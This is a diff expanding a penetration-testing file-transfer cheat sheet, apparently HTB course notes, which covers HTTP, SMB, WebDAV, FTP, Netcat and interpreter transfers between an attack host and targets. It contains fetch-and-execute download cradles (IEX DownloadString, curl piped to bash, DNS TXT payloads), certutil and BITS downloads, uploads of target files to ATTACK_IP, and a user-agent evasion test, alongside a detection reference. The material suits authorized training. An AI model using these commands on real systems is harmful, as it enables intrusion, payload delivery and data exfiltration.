@@ -1,88 +1,646 @@
 # 📦 File Transfer Cheat Sheet
 
-## Python HTTP Server
+> Authorized labs and assessments only. Replace placeholders such as `ATTACK_IP`, `TARGET_IP`, paths, users, and passwords. Prefer authenticated, encrypted transports and verify SHA-256 after every transfer.
 
-On attacker:
+## Command-level decision matrix
 
-```bash
-python3 -m http.server 8000
-```
+Placeholders used below:
 
-Linux target:
+- `PWNBOX_IP` or `ATTACK_IP`: the assessment/Pwnbox address reachable from the target
+- `TARGET_IP`: the Windows or Linux target
+- `FILE`: the filename being transferred
+- `WINDOWS_FILE` / `LINUX_FILE`: the complete source path
 
-```bash
-wget http://<ATTACKER_IP>:8000/<FILE>
-curl -O http://<ATTACKER_IP>:8000/<FILE>
-```
+### Windows targets
 
-Windows target:
+| Method | Port | Direction | Pwnbox command | Windows command | If blocked or unavailable |
+|---|---:|---|---|---|---|
+| PowerShell HTTP | 80/8000 | Pwnbox → Windows | `cd /tmp/share && python3 -m http.server 8000` | `(New-Object Net.WebClient).DownloadFile('http://PWNBOX_IP:8000/FILE','C:\Users\Public\FILE')` | Try `Invoke-WebRequest`, SMB, FTP or WebDAV |
+| Invoke-WebRequest | 80/443 | Pwnbox → Windows | `python3 -m http.server 8000` | `Invoke-WebRequest http://PWNBOX_IP:8000/FILE -OutFile C:\Users\Public\FILE` | Add `-UseBasicParsing` or use WebClient |
+| PowerShell uploadserver | 8000 | Windows → Pwnbox | `cd /tmp/share && python3 -m uploadserver` | `Invoke-FileUpload -Uri http://PWNBOX_IP:8000/upload -File WINDOWS_FILE` | Use SMB, WebDAV, FTP or Base64 POST |
+| Authenticated SMB | 445 | Both | `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test` | `net use n: \\PWNBOX_IP\share /user:test test` | If 445 is blocked, use WebDAV or HTTP/S |
+| WebDAV | 80/443 | Both | `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous` | `copy WINDOWS_FILE \\PWNBOX_IP\DavWWWRoot\` | Use HTTP uploadserver or FTP |
+| FTP download | 21 + data ports | Pwnbox → Windows | `cd /tmp/share && sudo python3 -m pyftpdlib --port 21` | `(New-Object Net.WebClient).DownloadFile('ftp://PWNBOX_IP/FILE','C:\Users\Public\FILE')` | Use HTTP, SMB or WebDAV |
+| FTP upload | 21 + data ports | Windows → Pwnbox | `cd /tmp/share && sudo python3 -m pyftpdlib --port 21 --write` | `(New-Object Net.WebClient).UploadFile('ftp://PWNBOX_IP/FILE','WINDOWS_FILE')` | Confirm `--write`; otherwise use HTTP or SMB |
+| RDP drive | 3389 | Both | `xfreerdp /v:TARGET_IP /u:USER /p:'PASSWORD' /drive:linux,/tmp/share` | Access `\\tsclient\linux` | If redirection is disabled, use SMB, WebDAV or HTTP |
+| WinRM | 5985/5986 | Windows ↔ Windows | Not applicable | `$Session=New-PSSession -ComputerName HOST` then `Copy-Item -ToSession` or `-FromSession` | Requires WinRM and appropriate permissions |
+| Base64 | No dedicated port | Both | `cat FILE \| base64 -w 0; echo` | `[IO.File]::WriteAllBytes('C:\Path\FILE',[Convert]::FromBase64String('BASE64'))` | Use only for small files; use a network protocol for larger files |
 
-```powershell
-Invoke-WebRequest http://<ATTACKER_IP>:8000/<FILE> -OutFile <FILE>
-```
-
-or:
+SMB after mounting the share:
 
 ```cmd
-certutil -urlcache -split -f http://<ATTACKER_IP>:8000/<FILE> <FILE>
+:: Pwnbox to Windows
+copy n:\FILE C:\Users\Public\FILE
+
+:: Windows to Pwnbox
+copy C:\Windows\System32\drivers\etc\hosts n:\windows-hosts.txt
 ```
 
-## SCP
+WebDAV installation and use:
 
 ```bash
-scp <FILE> <USER>@<TARGET_IP>:/tmp/
-scp <USER>@<TARGET_IP>:/path/to/file .
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
 ```
 
-## Netcat
-
-Receiver:
-
-```bash
-nc -lvnp 9001 > file.bin
+```cmd
+dir \\PWNBOX_IP\DavWWWRoot
+copy C:\Windows\System32\drivers\etc\hosts \\PWNBOX_IP\DavWWWRoot\
+copy \\PWNBOX_IP\DavWWWRoot\FILE C:\Users\Public\FILE
 ```
 
-Sender:
+### Linux targets
+
+| Method | Port | Direction | Command | If blocked or unavailable |
+|---|---:|---|---|---|
+| wget | 80/443 | Web server → Linux | `wget http://PWNBOX_IP:8000/FILE -O /tmp/FILE` | Try curl, Python, PHP, Ruby or `/dev/tcp` |
+| curl | 80/443 | Web server → Linux | `curl -o /tmp/FILE http://PWNBOX_IP:8000/FILE` | Try wget or an interpreter |
+| SCP upload | 22 | Pwnbox → Linux | `scp FILE USER@TARGET_IP:/tmp/FILE` | Use HTTP/S if SSH is blocked |
+| SCP download | 22 | Linux → Pwnbox | `scp USER@TARGET_IP:/path/FILE .` | Use HTTP uploadserver if SSH is blocked |
+| HTTPS uploadserver | 443 | Linux → Pwnbox | Pwnbox: `sudo python3 -m uploadserver 443 --server-certificate ~/server.pem`; target uses an HTTP POST client | Use SCP or HTTP if TLS cannot be established |
+| Base64 | No dedicated port | Both | Encode: `cat FILE \| base64 -w 0; echo`; decode: `echo -n 'BASE64' \| base64 -d > FILE` | Only practical for smaller files |
+| Bash `/dev/tcp` | Any chosen TCP port | Pwnbox → Linux | `cat < /dev/tcp/PWNBOX_IP/443 > FILE` | Useful when Netcat, wget and curl are missing |
+
+Temporary HTTP servers taught by the module:
 
 ```bash
-nc <RECEIVER_IP> 9001 < file.bin
+python3 -m http.server
+python2.7 -m SimpleHTTPServer
+php -S 0.0.0.0:8000
+ruby -run -ehttpd . -p8000
 ```
 
-## Base64 Small Files
+### Netcat and Ncat directions
 
-Encode:
+| Connection direction | Receiving side | Sending side | Use case |
+|---|---|---|---|
+| Pwnbox connects to target | Target: `nc -l -p 8000 > FILE` | Pwnbox: `nc -q 0 TARGET_IP 8000 < FILE` | Inbound connections to the target are permitted |
+| Pwnbox connects to target with Ncat | Target: `ncat -l -p 8000 --recv-only > FILE` | Pwnbox: `ncat --send-only TARGET_IP 8000 < FILE` | Same direction with explicit completion modes |
+| Target connects to Pwnbox | Target: `nc PWNBOX_IP 443 > FILE` | Pwnbox: `sudo nc -l -p 443 -q 0 < FILE` | Target blocks inbound connections but permits outbound traffic |
+| Target connects to Pwnbox with Ncat | Target: `ncat PWNBOX_IP 443 --recv-only > FILE` | Pwnbox: `sudo ncat -l -p 443 --send-only < FILE` | Same outbound direction with explicit completion modes |
+| Target lacks Netcat | Target: `cat < /dev/tcp/PWNBOX_IP/443 > FILE` | Pwnbox: `sudo nc -l -p 443 -q 0 < FILE` | Bash supports `/dev/tcp` but Netcat is missing |
+
+### Interpreter fallbacks
+
+| Interpreter | Download command |
+|---|---|
+| Python 2 | `python2.7 -c 'import urllib;urllib.urlretrieve("http://PWNBOX_IP:8000/FILE","FILE")'` |
+| Python 3 | `python3 -c 'import urllib.request;urllib.request.urlretrieve("http://PWNBOX_IP:8000/FILE","FILE")'` |
+| PHP | `php -r '$f=file_get_contents("http://PWNBOX_IP:8000/FILE");file_put_contents("FILE",$f);'` |
+| Ruby | `ruby -e 'require "net/http";File.write("FILE",Net::HTTP.get(URI("http://PWNBOX_IP:8000/FILE")))'` |
+| Perl | `perl -e 'use LWP::Simple;getstore("http://PWNBOX_IP:8000/FILE","FILE");'` |
+
+### Failure-to-fallback map
+
+| Failure | Next method |
+|---|---|
+| External GitHub name cannot resolve | Download on Pwnbox and rehost locally over HTTP, SMB or FTP |
+| PowerShell web cmdlet is unavailable | WebClient → BITS → another allowed protocol |
+| Internet Explorer parsing error | Add `-UseBasicParsing` |
+| HTTPS certificate is untrusted | Use a trusted certificate; use HTTP only inside an isolated lab |
+| HTTP download works but upload fails | `uploadserver`, WebDAV, FTP `--write` or SMB |
+| SMB guest access is blocked | Authenticated Impacket SMB plus `net use` |
+| SMB port 445 is blocked | WebDAV or HTTP/S |
+| FTP download works but upload fails | Restart `pyftpdlib` using `--write` |
+| FTP data connection is blocked | HTTP/S or SCP |
+| SSH port 22 is blocked | HTTP/S |
+| RDP redirected drive is missing | SMB, WebDAV, FTP or HTTP |
+| Inbound connection to target is blocked | Listen on Pwnbox and make the target connect outward |
+| wget/curl is missing | Python, PHP, Ruby, Perl or `/dev/tcp` |
+| No network transfer path exists | Base64 through the available text channel |
+| File contains sensitive assessment data | SCP/SFTP/HTTPS plus file encryption |
+
+Changing tools does not bypass a blocked protocol. For example, WebClient and `Invoke-WebRequest` both still use HTTP/S. Change the client when a program is unavailable; change the protocol when the network path is blocked.
+
+---
+
+## Temporary HTTP servers
 
 ```bash
-base64 -w 0 file.bin
+# Python 3
+python3 -m http.server 8000 --directory /srv/share
+
+# Python 2
+cd /srv/share && python2.7 -m SimpleHTTPServer 8000
+
+# PHP
+php -S 0.0.0.0:8000 -t /srv/share
+
+# Ruby
+cd /srv/share && ruby -run -ehttpd . -p8000
 ```
 
-Decode:
+Check the listener:
 
 ```bash
+ss -lntp | grep ':8000'
+```
+
+## Linux HTTP downloads
+
+```bash
+wget http://ATTACK_IP:8000/file.bin -O /tmp/file.bin
+curl -fL http://ATTACK_IP:8000/file.bin -o /tmp/file.bin
+```
+
+In-memory execution of reviewed content only:
+
+```bash
+curl -fsSL http://ATTACK_IP:8000/script.sh | bash
+wget -qO- http://ATTACK_IP:8000/script.py | python3
+```
+
+## Windows HTTP downloads
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('http://ATTACK_IP:8000/file.bin','C:\\Temp\\file.bin')
+(New-Object Net.WebClient).DownloadFileAsync('http://ATTACK_IP:8000/file.bin','C:\\Temp\\file.bin')
+Invoke-WebRequest 'http://ATTACK_IP:8000/file.bin' -OutFile 'C:\\Temp\\file.bin'
+Invoke-RestMethod 'http://ATTACK_IP:8000/file.bin' -OutFile 'C:\\Temp\\file.bin'
+```
+
+Download reviewed PowerShell text into memory:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACK_IP:8000/script.ps1')
+```
+
+Older PowerShell:
+
+```powershell
+Invoke-WebRequest 'http://ATTACK_IP:8000/file.bin' -UseBasicParsing -OutFile 'C:\\Temp\\file.bin'
+```
+
+## PowerShell download cradles
+
+These retrieve and immediately execute remote text. Use only in an authorized lab after validating the source. The safer workflow is download → inspect/hash → execute.
+
+```powershell
+# WebClient
+IEX (New-Object Net.WebClient).DownloadString('http://LAB_SERVER/script.ps1')
+
+# PowerShell 3.0+
+IEX (Invoke-WebRequest 'http://LAB_SERVER/script.ps1' -UseBasicParsing).Content
+
+# MSXML COM
+$h=New-Object -ComObject Msxml2.XMLHTTP
+$h.Open('GET','http://LAB_SERVER/script.ps1',$false)
+$h.Send()
+IEX $h.ResponseText
+
+# WinHTTP COM — uses WinHTTP proxy configuration
+$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1
+$h.Open('GET','http://LAB_SERVER/script.ps1',$false)
+$h.Send()
+IEX $h.ResponseText
+```
+
+Legacy Internet Explorer COM:
+
+```powershell
+$ie=New-Object -ComObject InternetExplorer.Application
+$ie.Visible=$false
+$ie.Navigate('http://LAB_SERVER/script.ps1')
+Start-Sleep 5
+$r=$ie.Document.body.innerHTML
+$ie.Quit()
+IEX $r
+```
+
+BITS—touches disk:
+
+```powershell
+Import-Module BitsTransfer
+Start-BitsTransfer 'http://LAB_SERVER/script.ps1' "$env:TEMP\transfer.tmp"
+$r=Get-Content "$env:TEMP\transfer.tmp" -Raw
+Remove-Item "$env:TEMP\transfer.tmp"
+IEX $r
+```
+
+DNS TXT transport:
+
+```powershell
+$txt=(Resolve-DnsName -Type TXT payload.lab.example).Strings -join ''
+$code=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($txt))
+IEX $code
+```
+
+XML-hosted command:
+
+```powershell
+$xml=New-Object System.Xml.XmlDocument
+$xml.Load('https://LAB_SERVER/command.xml')
+$xml.command.a.execute | IEX
+```
+
+DNS TXT data must fit DNS limits or be chunked. Base64 is not encryption. Remote content can change, so pin, inspect, and preserve the response during an authorized test.
+
+BITS:
+
+```powershell
+Import-Module BitsTransfer
+Start-BitsTransfer -Source 'http://ATTACK_IP:8000/file.bin' -Destination 'C:\\Temp\\file.bin'
+```
+
+---
+
+## Python uploadserver
+
+HTTP receiver:
+
+```bash
+python3 -m pip install uploadserver
+mkdir -p /srv/uploads && cd /srv/uploads
+python3 -m uploadserver 8000
+```
+
+HTTPS receiver with a short-lived lab certificate:
+
+```bash
+openssl req -x509 -newkey rsa:2048 -nodes \
+  -keyout server.pem -out server.pem -days 1
+python3 -m uploadserver 443 --server-certificate server.pem
+```
+
+Python upload:
+
+```bash
+python3 -c 'import requests; requests.post("http://ATTACK_IP:8000/upload", files={"files":open("/tmp/result.txt","rb")})'
+```
+
+PowerShell upload when the appropriate helper/function is loaded:
+
+```powershell
+Invoke-FileUpload -Uri 'http://ATTACK_IP:8000/upload' -File 'C:\\Temp\\result.txt'
+```
+
+---
+
+## SCP and SFTP
+
+```bash
+# local to remote
+scp ./tool.sh user@TARGET_IP:/tmp/tool.sh
+
+# remote to local
+scp user@TARGET_IP:/tmp/result.txt ./result.txt
+
+# recursive directory
+scp -r ./directory user@TARGET_IP:/tmp/
+
+# interactive SFTP
+sftp user@TARGET_IP
+```
+
+---
+
+## Base64
+
+Base64 is encoding, not encryption. Use only for small files.
+
+Linux encode/decode:
+
+```bash
+base64 -w 0 file.bin > file.b64
 echo '<BASE64>' | base64 -d > file.bin
 ```
 
-PowerShell decode:
+PowerShell encode/decode:
 
 ```powershell
-[IO.File]::WriteAllBytes('file.bin',[Convert]::FromBase64String('<BASE64>'))
+[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Temp\\file.bin'))
+[IO.File]::WriteAllBytes('C:\\Temp\\file.bin',[Convert]::FromBase64String('<BASE64>'))
 ```
 
-## Quick Choice
+Avoid long Base64 strings in `cmd.exe`; its command line is limited to roughly 8,191 characters.
 
-```text
-HTTP available? → Python server + wget/curl/IWR
-SSH creds? → SCP
-Only raw TCP? → Netcat
-Tiny file / awkward channel? → Base64
-```
+---
 
-## After Transfer
+## Authenticated SMB share
+
+Attack host:
 
 ```bash
-chmod +x <FILE>
-file <FILE>
-sha256sum <FILE>
+sudo mkdir -p /srv/share
+sudo impacket-smbserver share /srv/share \
+  -smb2support -username labuser -password '<STRONG_PASSWORD>'
 ```
 
-Only transfer tooling permitted by the competition or lab rules.
+Windows:
+
+```cmd
+net use \\ATTACK_IP\share /user:labuser <STRONG_PASSWORD>
+copy \\ATTACK_IP\share\tool.exe C:\Temp\tool.exe
+copy C:\Temp\result.txt \\ATTACK_IP\share\result.txt
+net use \\ATTACK_IP\share /delete
+```
+
+---
+
+## WebDAV
+
+Attack host:
+
+```bash
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/srv/share --auth=anonymous
+```
+
+Windows:
+
+```cmd
+dir \\ATTACK_IP\DavWWWRoot
+copy \\ATTACK_IP\DavWWWRoot\tool.exe C:\Temp\tool.exe
+copy C:\Temp\result.txt \\ATTACK_IP\DavWWWRoot\result.txt
+```
+
+Anonymous HTTP WebDAV is lab-only. Use HTTPS and authentication for real assessment data.
+
+---
+
+## FTP
+
+Temporary lab server:
+
+```bash
+sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+PowerShell:
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('ftp://ATTACK_IP/file.bin','C:\\Temp\\file.bin')
+(New-Object Net.WebClient).UploadFile('ftp://ATTACK_IP/result.txt','C:\\Temp\\result.txt')
+```
+
+Legacy Windows client command file:
+
+```text
+open ATTACK_IP
+USER
+PASSWORD
+binary
+get file.bin C:\Temp\file.bin
+put C:\Temp\result.txt result.txt
+bye
+```
+
+```cmd
+ftp -s:ftp-commands.txt
+```
+
+FTP is plaintext; prefer SFTP or HTTPS.
+
+---
+
+## Netcat and Ncat
+
+Receiver listens, sender connects:
+
+```bash
+# receiver
+nc -lvnp 9001 > received.bin
+
+# sender
+nc RECEIVER_IP 9001 < file.bin
+```
+
+Ncat with explicit modes:
+
+```bash
+ncat -l 9001 --recv-only > received.bin
+ncat RECEIVER_IP 9001 --send-only < file.bin
+```
+
+Bash fallback:
+
+```bash
+cat file.bin > /dev/tcp/RECEIVER_IP/9001
+```
+
+No encryption/authentication/integrity: use only on an isolated authorized network and compare hashes.
+
+---
+
+## Bash `/dev/tcp` HTTP fallback
+
+```bash
+exec 3<>/dev/tcp/ATTACK_IP/8000
+printf 'GET /file.bin HTTP/1.0\r\nHost: ATTACK_IP\r\n\r\n' >&3
+cat <&3 > response.bin
+```
+
+Remove HTTP headers before treating `response.bin` as the downloaded file.
+
+---
+
+## Language one-liners
+
+Python:
+
+```bash
+python2.7 -c 'import urllib; urllib.urlretrieve("http://ATTACK_IP:8000/file", "file")'
+python3 -c 'import urllib.request; urllib.request.urlretrieve("http://ATTACK_IP:8000/file", "file")'
+```
+
+PHP:
+
+```bash
+php -r '$d=file_get_contents("http://ATTACK_IP:8000/file"); file_put_contents("file",$d);'
+```
+
+Ruby:
+
+```bash
+ruby -e 'require "net/http"; File.write("file",Net::HTTP.get(URI("http://ATTACK_IP:8000/file")))'
+```
+
+Perl:
+
+```bash
+perl -e 'use LWP::Simple; getstore("http://ATTACK_IP:8000/file","file");'
+```
+
+Windows Script Host:
+
+```cmd
+cscript.exe /nologo wget.js http://ATTACK_IP:8000/file.bin C:\Temp\file.bin
+cscript.exe /nologo wget.vbs http://ATTACK_IP:8000/file.bin C:\Temp\file.bin
+```
+
+JavaScript/VBScript downloaders commonly use WinHTTP/XMLHTTP plus `ADODB.Stream`.
+
+---
+
+## PowerShell Remoting
+
+```powershell
+$s = New-PSSession -ComputerName TARGET -Credential (Get-Credential)
+Copy-Item .\\tool.ps1 -Destination 'C:\\Temp\\tool.ps1' -ToSession $s
+Copy-Item 'C:\\Temp\\result.txt' -Destination .\\result.txt -FromSession $s
+Remove-PSSession $s
+```
+
+WinRM defaults: TCP 5985 (HTTP) and 5986 (HTTPS).
+
+---
+
+## RDP drive mapping
+
+```bash
+xfreerdp /v:TARGET_IP /u:USER /p:'PASSWORD' /drive:share,/srv/share
+rdesktop TARGET_IP -r disk:share=/srv/share
+```
+
+Windows path:
+
+```text
+\\tsclient\share
+```
+
+---
+
+## Encrypt files before transfer
+
+OpenSSL encrypt/decrypt:
+
+```bash
+openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
+  -in results.txt -out results.enc
+
+openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 \
+  -in results.enc -out results.txt
+```
+
+PowerShell helper after reviewing and importing it:
+
+```powershell
+Import-Module .\\Invoke-AESEncryption.ps1
+Invoke-AESEncryption -Mode Encrypt -Key '<UNIQUE_STRONG_SECRET>' -Path .\\results.txt
+Invoke-AESEncryption -Mode Decrypt -Key '<UNIQUE_STRONG_SECRET>' -Path .\\results.txt.aes
+```
+
+Use a unique secret per engagement and send it through a separate approved channel.
+
+---
+
+## Nginx HTTP PUT receiver
+
+```bash
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+```
+
+`/etc/nginx/sites-available/upload.conf`:
+
+```nginx
+server {
+    listen 9001;
+    location /SecretUploadDirectory/ {
+        root /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+```
+
+```bash
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/upload.conf
+sudo nginx -t
+sudo systemctl restart nginx
+curl -T ./result.txt http://SERVER_IP:9001/SecretUploadDirectory/result.txt
+```
+
+Troubleshoot:
+
+```bash
+tail -f /var/log/nginx/error.log
+ss -lntp
+```
+
+Use authentication, TLS, source restrictions, a non-executable directory, file-size limits, and no directory listing.
+
+---
+
+## Living-off-the-land examples
+
+BITS:
+
+```powershell
+Start-BitsTransfer -Source 'http://ATTACK_IP:8000/file.bin' -Destination 'C:\\Temp\\file.bin'
+```
+
+Certutil:
+
+```cmd
+certutil.exe -verifyctl -split -f http://ATTACK_IP:8000/file.bin C:\Temp\file.bin
+```
+
+OpenSSL stream:
+
+```bash
+# sender
+openssl s_server -quiet -accept 9001 -cert certificate.pem -key key.pem < file.bin
+
+# receiver
+openssl s_client -connect SENDER_IP:9001 -quiet > file.bin
+```
+
+Look up approved techniques by function in LOLBAS (Windows) and GTFOBins (Linux). Expect endpoint and network telemetry.
+
+---
+
+## Detection reference
+
+| Method | Common HTTP indicator |
+|---|---|
+| PowerShell | `WindowsPowerShell/<version>` |
+| WinHTTP COM | `WinHttp.WinHttpRequest` |
+| MSXML COM | Legacy IE/Trident-like user agent |
+| Certutil | `Microsoft-CryptoAPI/<version>` |
+| BITS | `Microsoft BITS/<version>` and often `HEAD` before `GET` |
+
+User-agent strings are client-controlled. Correlate with process creation, PowerShell/AMSI logs, DNS/proxy/firewall data, destination rarity, file writes, and execution.
+
+Download-cradle signals: `IEX` consuming network-derived content; PowerShell-created IE, MSXML, or WinHTTP COM objects; BITS download/read/delete chains; unusual DNS TXT queries followed by Base64 decoding; and remotely loaded XML nodes flowing into execution.
+
+Authorized user-agent test:
+
+```powershell
+$ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest 'http://ATTACK_IP:8000/file.bin' -UserAgent $ua -OutFile 'C:\\Temp\\file.bin'
+```
+
+Changing the header does not remove other telemetry. Use only when evasive testing is explicitly in scope.
+
+---
+
+## Validate integrity
+
+Linux:
+
+```bash
+sha256sum file.bin
+```
+
+Windows:
+
+```powershell
+Get-FileHash .\\file.bin -Algorithm SHA256
+```
+
+The source and destination hashes must match.
+
+## Cleanup checklist
+
+- Stop HTTP/S, FTP, SMB, WebDAV, Netcat, OpenSSL, and Nginx listeners
+- Remove temporary shares, mapped drives, WinRM sessions, accounts, and certificates
+- Remove temporary firewall rules and relaxed validation settings
+- Delete transferred test files according to the engagement plan
+- Preserve required evidence, hashes, and operator notes in the approved location
+
+## Related notes
+
+- [HTB Academy module notes](../platforms/hack-the-box/penetration-tester-path/getting-started-file-transfers.md)
+- [Unified file-transfer knowledge](../knowledge-base/exploitation/file-transfer.md)
+
